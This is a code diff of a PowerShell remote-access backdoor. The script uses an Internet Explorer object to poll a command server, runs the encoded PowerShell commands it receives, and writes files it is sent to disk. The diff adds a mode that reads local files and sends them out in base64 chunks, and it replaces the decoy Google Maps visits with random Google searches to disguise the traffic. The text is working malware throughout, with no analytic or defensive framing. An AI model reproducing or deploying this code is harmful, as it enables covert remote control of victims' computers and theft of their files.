@@ -1,14 +1,11 @@
-$SRV = '';
 $CHUNK_SIZE = 35000;
-
-function enc {
-  param($m);
-  return [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($m));
-}
+$SIZE_LIMIT = 8500000;
+$SRV = '';
+$SEARCH_DICTIONARY = @('bitcoin', 'vacation', 'dancing', 'facebook', 'reddit', 'cat', 'dog', 'gif', 'iphone', 'trump', 'youtube', 'amazon', 'skydiving', 'nfl', 'football', 'basketball');
 
 function get {
   param($ie, $k, $d);
-  $x = enc $d;
+  $x = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($d));
   $ie.navigate2($SRV + "?$k=" + $x, 14, 0, $null, $null);
   while ($ie.busy -or ($ie.readystate -ne 4)) {sleep -seconds 1};
   return $ie.document.lastchild.innertext;
@@ -16,9 +13,8 @@ function get {
 
 function post {
   param($ie, $k, $d, $p);
-  $x = enc $d;
-  $e = New-Object System.Text.ASCIIEncoding;
-  $ie.navigate2($SRV + "?$k=" + $x, 14, 0, $e.GetBytes("d=$p"), $null);
+  $x = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($d));
+  $ie.navigate2($SRV + "?$k=" + $x, 14, 0, [Text.Encoding]::UTF8.GetBytes("d=$p"), $null);
   while ($ie.busy -or ($ie.readystate -ne 4)) {sleep -seconds 1};
 }
 
@@ -39,25 +35,31 @@ function run {
     post $ie  'Tx'  ($s + '|2') '0';
     if ($type -eq '@') {
       $xc = $buf -join '';
-      $res = powershell.exe -nopr -noni -enc $xc;
-      if ($res -eq $null) {
-        $res = 'NULL';
+      $r = powershell.exe -nopr -noni -enc $xc;
+      if ($r -eq $null) {
+        $r = 'NULL';
       } else {
-        $res = $res | out-string;
+        $r = $r | out-string;
+      }
+      $r = $r.ToCharArray();
+    } elseif ($type -eq '^') {
+      $r = [IO.file]::ReadAllBytes([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($buf -join '')));
+      if ($r.length -ge $SIZE_LIMIT) {
+        $r = '';
       }
     } else {
-      [IO.file]::WriteAllBytes("$type", [Convert]::FromBase64String([String]::join('', $buf)));
-      $res = 'NULL';
+      [IO.file]::WriteAllBytes("$type", [Convert]::FromBase64String($buf -join ''));
+      $r = 'NULL'.ToCharArray();
     }
     $col = 3;
-    $idx = 0;
-    while ($idx -le ($res.length - $CHUNK_SIZE)) {
-      $x = enc $res.substring($idx, $CHUNK_SIZE);
+    $i = 0;
+    while ($i -le ($r.length - $CHUNK_SIZE)) {
+      $x = [Convert]::ToBase64String($r[$i..($i + $CHUNK_SIZE)]);
       post $ie 'Rx' ($s + '|' + $col) $x;
-      $idx += $CHUNK_SIZE;
+      $i += $CHUNK_SIZE;
       $col++;
     }
-    $x = enc($res.substring($idx));
+    $x = [Convert]::ToBase64String($r[$i..($r.length - 1)]);
     post $ie 'Rx' ($s + '|' + $col) $x;
     post $ie 'Rx' ($s + '|2') '1';
   }
@@ -72,8 +74,10 @@ while (1) {
     $s = $ip.ipaddress[0] + '|' + $env:USERNAME;
     while (1) {
       run $s $ie;
-      $ie.navigate('https://www.google.com/maps/', 14);
-      $delay = Get-Random -InputObject 5, 10, 15;
+      $r1 = Get-Random -InputObject $SEARCH_DICTIONARY;
+      $r2 = Get-Random -InputObject $SEARCH_DICTIONARY;
+      $ie.navigate("https://www.google.com/search?q=$r1+$r2", 14);
+      $delay = Get-Random -InputObject 5, 6, 7, 8, 9, 10;
       sleep -seconds $delay;
       $ie.stop();
     }
